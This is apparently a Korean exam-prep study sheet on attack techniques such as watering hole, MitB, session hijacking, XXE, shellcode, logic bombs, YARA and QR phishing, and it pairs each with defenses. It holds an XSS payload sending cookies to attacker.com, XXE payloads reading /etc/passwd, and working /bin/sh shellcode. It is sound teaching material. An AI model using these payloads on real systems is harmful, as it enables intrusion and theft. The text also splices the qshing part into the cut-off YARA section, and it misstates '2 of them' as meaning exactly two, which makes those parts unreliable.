# 공격 기법 - 실기 필수 암기

## 🔴 워터링 홀 (Watering Hole) 공격 ★★★

### 문제 (2024년 기출)
```
워터링 홀에 대한 설명으로 올바른 것은?
```

### ✅ 정답
```
워터링 홀 (Watering Hole) 공격

정의:
특정 표적이 자주 방문하는 웹사이트를 감염시켜,
해당 사이트를 방문한 사용자를 공격하는 APT 공격 기법

유래:
사자가 물웅덩이(Watering Hole) 근처에서 먹이감을 기다리듯,
공격자가 표적이 자주 가는 사이트에서 기다림

공격 단계:
1. 표적 선정 및 정보 수집
   - 표적 기업 직원들이 자주 방문하는 사이트 파악
   - 업계 뉴스 사이트, 커뮤니티 등

2. 웹사이트 감염
   - 해당 사이트에 악성 코드 삽입
   - SQL Injection, XSS, 취약점 이용

3. 대기 (Watering Hole)
   - 표적이 사이트 방문하기를 기다림

4. 감염 및 공격
   - 표적 방문 시 Drive-by Download
   - 악성코드 자동 설치
   - 좀비 PC로 만들어 추가 공격

예시:
- 2013년 미국 국방업체 공격
- 2017년 금융권 대상 공격
```

### 방어 방법
```
조직 차원:
1. 웹 필터링
   - 업무와 무관한 사이트 차단
   - 화이트리스트 방식 운영

2. 샌드박스
   - 의심스러운 코드 격리 실행

3. 보안 교육
   - 직원 보안 인식 제고

개인 차원:
1. 브라우저 업데이트
2. 플러그인 최소화 (Flash, Java 제거)
3. NoScript 확장 프로그램 사용
```

## 🔴 MitB (Man-in-the-Browser) 공격 ★★★

### 문제 (2024년 기출)
```
MitB 취약점의 의미는?
```

### ✅ 정답
```
MitB (Man-in-the-Browser)
= 브라우저 중간자 공격

정의:
사용자의 웹 브라우저 내부에 악성코드를 삽입하여,
브라우저와 서버 간 통신을 조작하는 공격

특징:
- HTTPS 암호화도 우회 가능!
- 사용자 눈에 보이는 화면과 실제 전송 데이터가 다름
```

### MitB vs MITM 비교
```
┌──────────┬────────────────┬────────────────┐
│   구분   │     MITM       │     MitB       │
├──────────┼────────────────┼────────────────┤
│ 공격위치 │ 네트워크 경로  │ 브라우저 내부  │
├──────────┼────────────────┼────────────────┤
│ HTTPS    │ 인증서 경고    │ 탐지 어려움 ★ │
│ 우회     │ (탐지 가능)    │ (암호화 후 조작)│
├──────────┼────────────────┼────────────────┤
│ 공격방법 │ 프록시, ARP    │ 브라우저 확장   │
│          │ 스푸핑 등      │ 프로그램, DLL   │
│          │                │ 인젝션          │
└──────────┴────────────────┴────────────────┘
```

### 공격 시나리오 (온라인 뱅킹)
```
[정상 흐름]
사용자 → [브라우저] → [은행 서버]
입금: 홍길동, 100만원 → 홍길동 계좌에 100만원 입금

[MitB 공격]
사용자 → [브라우저 + 악성코드] → [은행 서버]
화면표시: 홍길동, 100만원 (사용자가 봄)
실제전송: 공격자, 100만원 (악성코드가 변조)

결과: 사용자는 정상 입금한 줄 알지만, 공격자 계좌로 송금됨!
```

### 방어 방법
```
1. 백신 및 안티멀웨어
   - 악성 브라우저 확장 프로그램 탐지

2. OTP (One-Time Password)
   - 거래 내용을 OTP 장치에 표시
   - 실제 송금 내용 확인 가능

3. 거래 확인
   - 이메일/SMS로 거래 내용 재확인

4. 가상 키보드
   - 키로거 방어 (MitB는 방어 못함)
```

## 🔴 세션 하이재킹 공격 순서 ★★★

### 문제 (2024년 기출)
```
세션 하이재킹 공격 순서는?
```

### ✅ 정답
```
[1단계: 세션 모니터링]
   공격자가 네트워크를 스니핑하여
   피해자와 서버 간 세션 패킷 캡처
   도구: Wireshark, tcpdump

[2단계: 세션 ID 획득]
   세션 쿠키 또는 토큰 값 추출
   예: JSESSIONID=ABC123XYZ

[3단계: 세션 예측 또는 탈취]
   방법 1: 세션 ID 추측 (Prediction)
   - 패턴 분석하여 다음 세션 ID 예측

   방법 2: 세션 고정 (Session Fixation)
   - 공격자가 특정 세션 ID를 피해자에게 강제 설정

   방법 3: XSS를 통한 쿠키 탈취
   - <script>document.location='http://attacker.com?c='+document.cookie</script>

[4단계: 세션 하이재킹]
   공격자가 탈취한 세션 ID를 자신의 브라우저에 설정
   서버는 정상 사용자로 인식
   인증 우회!

[5단계: 악의적 행위]
   - 권한 있는 작업 수행
   - 정보 유출
   - 설정 변경
```

### 공격 흐름도
```
[정상 로그인]
사용자 → 서버: 로그인 (ID/PW)
서버 → 사용자: 세션 쿠키 (SESSIONID=ABC123)
사용자 → 서버: 요청 (SESSIONID=ABC123 포함)
서버: 인증 OK, 요청 처리

[공격자 개입]
   │
   ├─ 공격자가 스니핑
   │  네트워크 패킷 캡처
   │  SESSIONID=ABC123 획득
   │
   ▼
공격자 → 서버: 요청 (SESSIONID=ABC123 포함)
서버: 정상 사용자로 착각, 요청 처리!
```

### 방어 방법
```
1. HTTPS 사용
   - 세션 쿠키 암호화 전송
   - 스니핑 어려움

2. Secure, HttpOnly 쿠키 플래그
   Set-Cookie: SESSIONID=ABC123; Secure; HttpOnly; SameSite=Strict
   - Secure: HTTPS에서만 전송
   - HttpOnly: JavaScript 접근 차단 (XSS 방어)
   - SameSite: CSRF 방어

3. 세션 ID 재발급
   - 로그인 성공 후 새 세션 ID 발급
   - 권한 변경 시마다 재발급

4. 세션 타임아웃
   - 일정 시간 미사용 시 세션 만료

5. IP 주소 바인딩
   - 세션 ID와 IP 주소 연결
   - IP 변경 시 세션 무효화
```

## 🔴 XXE (XML External Entity) 취약점 ★★

### 문제 (2024년 기출)
```
XXE 취약점에 대한 설명으로 올바른 것은?
```

### ✅ 정답
```
XXE (XML External Entity) Injection

정의:
XML 파서가 외부 엔티티를 처리할 때 발생하는 취약점
공격자가 악의적인 외부 엔티티를 삽입하여 시스템 파일 읽기,
SSRF 공격, DoS 등을 수행

공격 원리:
XML DTD (Document Type Definition)의 외부 엔티티 참조 기능 악용
```

### 공격 예시
```
[정상 XML]
<?xml version="1.0"?>
<user>
  <name>홍길동</name>
  <email>hong@example.com</email>
</user>

[XXE 공격 XML]
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>attacker@evil.com</email>
</user>

결과:
&xxe; 엔티티가 /etc/passwd 파일 내용으로 치환됨
→ 서버 응답에 /etc/passwd 내용 노출!
```

### 공격 유형
```
1. 로컬 파일 읽기 (Local File Disclosure)
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   → /etc/passwd 내용 유출

2. SSRF (Server-Side Request Forgery)
   <!ENTITY xxe SYSTEM "http://internal-server/admin">
   → 내부 서버 접근

3. DoS (Billion Laughs Attack)
   <!ENTITY lol "lol">
   <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
   <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
   ...
   → 무한 확장으로 메모리 고갈
```

### 방어 방법
```
1. 외부 엔티티 비활성화 ★★★

Java (SAXParser):
SAXParserFactory factory = SAXParserFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

PHP (libxml):
libxml_disable_entity_loader(true);

2. 안전한 파서 사용
   - JSON 사용 고려 (XML 대신)

3. 입력값 검증
   - DTD 사용 금지
   - <!DOCTYPE 태그 필터링

4. 최소 권한 원칙
   - XML 파서 실행 계정 권한 최소화
```

## 🔴 Shellcode 작성 순서 ★★

### 문제 (2024년 기출)
```
Shellcode 작성 순서?
```

### ✅ 정답
```
[1단계: 목표 정의]
   - 수행할 작업 결정 (예: /bin/sh 실행, 백도어 등)

[2단계: 어셈블리 코드 작성]
   - 시스템 콜 사용
   - 예: execve("/bin/sh", NULL, NULL)

   Assembly 예시:
   xor eax, eax    ; eax = 0
   push eax        ; NULL 종료 문자
   push 0x68732f2f ; "//sh" (역순)
   push 0x6e69622f ; "/bin" (역순)
   mov ebx, esp    ; ebx = "/bin//sh"
   mov ecx, eax    ; ecx = NULL
   mov edx, eax    ; edx = NULL
   mov al, 0x0b    ; execve 시스템 콜 번호
   int 0x80        ; 시스템 콜 호출

[3단계: 어셈블리 컴파일]
   nasm -f elf shellcode.asm
   ld -m elf_i386 -o shellcode shellcode.o

[4단계: 기계어 추출]
   objdump -d shellcode
   또는
   for i in $(objdump -d shellcode | grep "^ " | cut -f2); do echo -n '\x'$i; done

   결과:
   \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80

[5단계: Null Byte 제거]
   - Shellcode에 \x00 (NULL) 있으면 strcpy 등에서 끊김
   - xor eax, eax 대신 xor eax, eax; inc eax; dec eax 등 우회

[6단계: 테스트]
   C 프로그램에 삽입하여 실행 테스트

   char shellcode[] =
       "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
       "\x68\x2f\x62\x69\x6e\x89\xe3\x89"
       "\xc1\x89\xc2\xb0\x0b\xcd\x80";

   int (*ret)() = (int(*)())shellcode;
   ret();

[7단계: 익스플로잇에 통합]
   - 버퍼 오버플로우 취약점 등에 삽입
```

## 🔴 이메일 발송 순서 ★★

### 문제 (2024년 기출)
```
이메일 발송 순서는?
```

### ✅ 정답
```
[1단계: 이메일 작성]
   사용자가 이메일 클라이언트(Outlook, Gmail)에서 작성

[2단계: SMTP 서버로 전송]
   사용자 PC → 발신자 SMTP 서버
   프로토콜: SMTP (포트 25, 587)
   인증 후 이메일 제출

[3단계: DNS MX 레코드 조회]
   발신자 SMTP 서버가 수신자 도메인의 MX 레코드 조회
   예: nslookup -type=MX example.com
   결과: mail.example.com (우선순위 10)

[4단계: 수신자 SMTP 서버로 전송]
   발신자 SMTP 서버 → 수신자 SMTP 서버
   프로토콜: SMTP (포트 25)
   메일 릴레이

[5단계: 수신자 메일함 저장]
   수신자 SMTP 서버가 이메일을 메일함에 저장

[6단계: 이메일 수신]
   수신자가 이메일 클라이언트로 확인
   프로토콜:
   - POP3 (포트 110): 다운로드 후 서버에서 삭제
   - IMAP (포트 143): 서버에 보관, 동기화
```

### 그림으로 이해
```
[발신자] alice@company.com
    │
    │ [1] 이메일 작성
    ▼
[이메일 클라이언트]
    │
    │ [2] SMTP (587) - 인증
    ▼
[company.com SMTP 서버]
    │
    │ [3] DNS MX 조회
    │     example.com의 메일 서버는?
    │     → mail.example.com
    │
    │ [4] SMTP (25) - 릴레이
    ▼
[example.com SMTP 서버]
    │
    │ [5] 메일함 저장
    ▼
[Bob의 메일함]
    │
    │ [6] POP3/IMAP으로 수신
    ▼
[수신자] bob@example.com
```

## 🔴 논리폭탄 (Logic Bomb) ★★

### 문제 (2024년 기출)
```
다음 설명에 해당하는 악성코드는?
- 특정 조건이 만족될 때까지 숨어 있다가 활성화됨
- 특정 날짜, 시간, 이벤트 등이 트리거 조건
- 시한폭탄처럼 작동
```

### ✅ 정답
```
논리폭탄 (Logic Bomb)
```

### 상세 설명

**정의**:
```
특정 조건(트리거)이 발생할 때까지 잠복해 있다가,
조건이 충족되면 악의적인 동작을 수행하는 악성 코드
```

**특징**: ★★★
```
1. 잠복성 (Dormant)
   - 평상시에는 아무 동작 안 함
   - 정상 프로그램처럼 위장
   - 탐지 매우 어려움

2. 조건부 실행 (Conditional Execution)
   - 특정 트리거 조건 필요
   - IF-THEN 로직

3. 시한성 (Time-based)
   - 특정 날짜/시간에 동작
   - 예: 2024년 12월 31일 23:59

4. 파괴성 (Destructive)
   - 데이터 삭제, 시스템 마비
   - 복구 어려움
```

**트리거 조건 예시**: ★★★
```
1. 시간 기반 (Time-based)
   - 특정 날짜: if (date == "2024-12-31")
   - 특정 시간: if (time == "23:59:59")
   - 카운트다운: if (days_remaining == 0)

2. 이벤트 기반 (Event-based)
   - 파일 삭제: if (file_deleted == "important.db")
   - 사용자 로그아웃: if (user == "admin" && logout)
   - 계정 삭제: if (account_exists("developer") == false)

3. 조건 기반 (Condition-based)
   - 특정 값 확인: if (salary < 100000)
   - 횟수 체크: if (login_count > 100)
   - 파일 존재: if (not exists("license.key"))
```

## 🔴 YARA 룰 (YARA Rules) ★★

### 문제 (2024년 기출)
```
다음 YARA 룰에 대한 설명 중 틀린 것은?

rule MalwareDetection {
    strings:
        $str1 = "evil.exe"
        $str2 = "malicious"
        $str3 = "backdoor"
    condition:
        $str1 or $str2 or $str3
}

보기:
1. 3가지 문자열 중 하나라도 발견되면 매칭됨
2. 3가지 문자열이 모두 발견되어야 매칭됨  ← 정답 (틀린 설명)
3. strings 섹션에서 탐지 패턴 정의
4. condition에서 매칭 조건 정의
```

### ✅ 정답
```
2번 (틀린 설명)

이유:
condition이 "or"이므로 3가지 중 하나만 발견되면 매칭됨
"and"였다면 모두 발견되어야 함
```

### YARA 상세 설명

**정의**:
```
YARA (Yet Another Recursive Acronym)

악성코드를 식별하고 분류하기 위한 패턴 매칭 도구
특정 패턴(문자열, 바이트 코드, 정규식 등)을 정의하여
파일이나 프로세스에서 악성코드 탐지
```

**사용 목적**: ★★★
```
1. 악성코드 탐지
   - 알려진 악성코드 시그니처 매칭
   - 변종 악성코드 탐지

2. 악성코드 분류
   - 악성코드 패밀리 식별
   - 유사 악성코드 그룹화

3. 포렌식 조사
   - 메모리 덤프 분석
   - 디스크 이미지 스캔

4. 위협 헌팅
   - 네트워크 트래픽 분석
   - 프로세스 메모리 스캔
```

**YARA 룰 구조**: ★★★

```yara
rule 룰이름 {
    meta:
        // 메타데이터 (설명, 작성자, 날짜 등)
        author = "Security Analyst"
        description = "Detects ransomware"
        date = "2024-01-01"

    strings:
        // 탐지할 패턴 정의
        $str1 = "evil"           // 문자열
        $hex1 = { 4D 5A 90 }     // 16진수 바이트
        $re1 = /malware[0-9]+/   // 정규식

    condition:
        // 매칭 조건
        $str1 or $hex1 or $re1
}
```

**각 섹션 설명**:

**1. meta (메타데이터)** ★
```yara
meta:
    author = "John Doe"
    description = "Ransomware detector"
    version = "1.0"
    date = "2024-01-01"
    reference = "https://..."

// 룰에 대한 부가 정보
// 탐지 로직에는 영향 없음
```

**2. strings (탐지 패턴)** ★★★
```yara
strings:
    // 1. 일반 문자열
    $text1 = "malware"
    $text2 = "virus" nocase        // 대소문자 구분 안 함

    // 2. 16진수 바이트 패턴
    $hex1 = { 4D 5A }              // MZ (PE 파일 시그니처)
    $hex2 = { E8 ?? ?? ?? ?? }     // ?? = 임의의 바이트

    // 3. 정규식
    $regex1 = /evil[0-9]{2,4}/     // evil + 2~4자리 숫자
    $regex2 = /(http|https):\/\//  // URL 패턴

    // 4. Wide 문자열 (유니코드)
    $wide1 = "password" wide       // 유니코드 문자열
```

**3. condition (매칭 조건)** ★★★
```yara
condition:
    // 논리 연산자
    $str1 and $str2                // 둘 다 있어야 함 ★★★
    $str1 or $str2                 // 하나만 있어도 됨 ★★★
    not $str1                      // 없어야 함

    // 개수 조건
    all of them                    // 모든 패턴 매칭
    any of them                    // 하나라도 매칭
    2 of them                      // 정확히 2개

    // 범위 조건
    $str1 at 0                     // 파일 시작 부분
    $str1 in (0..100)              // 처음 100바이트 내

    // 파일 크기 조건
    filesize < 100KB               // 파일 크기 100KB 미만

    // 조합
    ($str1 or $str2) and filesize < 1MB
```

**실전 예시**:

**예시 1: 랜섬웨어 탐지** ★★★

### 상세 설명

**정의**:

```
Qshing (Quishing)
```

```
QR Code Phishing
```

**공격 원리**: ★★★
```
1. 공격자가 악성 QR코드 생성
   - 피싱 사이트 URL 인코딩
   - 악성 APK 다운로드 링크
   - 악의적인 스크립트 실행

2. QR코드 배포
   - 이메일 첨부
   - 포스터, 전단지
   - 문자 메시지
   - 주차 요금 안내
   - 메뉴판 (레스토랑)

3. 사용자 스캔
   - QR코드 스캔 앱 사용
   - URL 확인 없이 바로 접속

4. 악성 동작 수행
   - 가짜 로그인 페이지 → 계정 탈취
   - 악성 앱 다운로드 → 악성코드 감염
   - 결제 페이지 → 금전 피해
```

**큐싱의 특징**: ★★★
```
1. 육안 확인 불가
   - QR코드 내용을 사람이 읽을 수 없음
   - URL이 어디로 연결되는지 알 수 없음 ★★★

2. 신뢰성 악용
   - 공식 서비스처럼 위장
   - "QR코드로 편리하게" 유도

3. 모바일 타겟
   - 대부분 스마트폰으로 스캔
   - 모바일 보안 솔루션 부족

4. 광범위 배포 가능
   - 물리적 매체 활용 (포스터, 스티커)
   - 대량 이메일 발송
```

**공격 시나리오**:

**시나리오 1: 주차 요금 사기** ★★★
```
공격:
1. 주차장에 가짜 QR코드 스티커 부착
   "주차 요금 결제: QR코드 스캔"

2. 사용자 스캔 → 가짜 결제 페이지

3. 카드 정보 입력 → 정보 탈취

실제 사례:
- 2023년 미국 텍사스주에서 다수 발생
- 공공 주차장 대상
```

**시나리오 2: 배송 알림 피싱**
```
공격:
1. 문자 메시지 발송
   "택배 도착! QR코드 스캔하여 확인"

2. QR코드 스캔 → 악성 APK 다운로드

3. 앱 설치 → 스미싱 앱 감염
   - SMS 탈취
   - 연락처 수집
   - 소액 결제

피해:
- 소액 결제 피해
- 개인정보 유출
- 추가 피싱 공격
```

**시나리오 3: 레스토랑 메뉴판**
```
공격:
1. 레스토랑 테이블에 가짜 QR코드
   "메뉴 보기: QR코드 스캔"

2. 스캔 → 가짜 음식 주문 페이지

3. 결제 정보 입력 → 카드 정보 탈취

또는:
→ 악성 앱 다운로드
→ 피싱 사이트로 리다이렉트
```

**시나리오 4: 이메일 첨부**
```
공격:
1. 공식 기관 위장 이메일
   "QR코드로 본인 인증 진행"

2. QR코드 이미지 첨부

3. 스캔 → 가짜 인증 페이지

4. 개인정보 입력 → 정보 탈취

예시:
- 세무서 사칭 (세금 환급)
- 은행 사칭 (보안 인증)
- 택배 사칭 (배송 확인)
```

**큐싱 vs 기존 피싱**:

| 구분 | 기존 피싱 | 큐싱 (Qshing) |
|------|----------|---------------|
| **매체** | 이메일, 문자 링크 | QR코드 ★★★ |
| **URL 확인** | 가능 (링크 표시) | 불가능 (인코딩) ★★★ |
| **탐지** | URL 필터링 가능 | 어려움 |
| **타겟** | PC, 모바일 | 주로 모바일 |
| **물리적 배포** | 어려움 | 쉬움 (스티커) |

**방어 방법**: ★★★

**사용자 측**:
```
1. QR코드 스캔 전 확인 ★★★
   - 누가 부착했는지 확인
   - 공식 매체인지 검증
   - 훼손되거나 덧붙인 흔적 확인

2. URL 미리보기 활성화
   - QR코드 스캔 앱 설정
   - "미리보기 후 이동" 옵션 사용
   - URL 확인 후 접속 결정

3. 신뢰할 수 있는 QR 스캐너 사용
   - 보안 기능 내장 앱
   - URL 검증 기능
   - 악성 사이트 경고 기능

4. 앱 설치 주의
   - 공식 앱 스토어만 이용
   - 출처 불명 APK 설치 금지
   - 권한 요구사항 확인

5. 의심스러운 QR코드 신고
   - 공공장소의 수상한 QR코드
   - 관리 기관에 신고
```

**기업/조직 측**:
```
1. 공식 QR코드 관리
   - 고유 디자인/로고 사용
   - 정기적 점검 및 교체
   - 훼손 시 즉시 제거

2. 사용자 교육
   - 큐싱 위험성 안내
   - 안전한 QR코드 사용법
   - 의심 시 확인 절차

3. 보안 QR코드 생성
   - 단축 URL 사용 (자체 도메인)
   - HTTPS 사용
   - 유효기간 설정

4. 모니터링
   - 비정상 트래픽 탐지
   - 가짜 QR코드 신고 접수
```

**기술적 방어**:
```
1. QR코드 스캔 앱 보안 기능
   - URL 검증 (피싱 사이트 DB 조회)
```

**핵심 요약**:
```
큐싱 (Qshing / Quishing): ★★

정의:
QR코드를 악용한 피싱 공격
= QR Code + Phishing

특징:
1. 육안으로 URL 확인 불가 ★★★
2. 모바일 타겟
3. 물리적 매체 활용 (스티커, 포스터)
4. 탐지 어려움

공격 시나리오:
- 주차 요금 결제 사기 ★★★
- 택배 알림 스미싱
- 레스토랑 메뉴판 위장
- 이메일 첨부

방어:
1. QR코드 스캔 전 출처 확인 ★★★
2. URL 미리보기 활성화
3. 신뢰할 수 있는 스캐너 사용
4. 의심스러운 앱 설치 거부

vs 기존 피싱:
- 기존: URL 확인 가능
- 큐싱: URL 인코딩되어 확인 불가 ★★★
```

**암기 팁**:
```
"Qshing = QR + Phishing"
"QR코드는 URL 숨김 → 육안 확인 불가" ★★★
"주차장, 택배, 메뉴판 → 실생활 피싱"
```
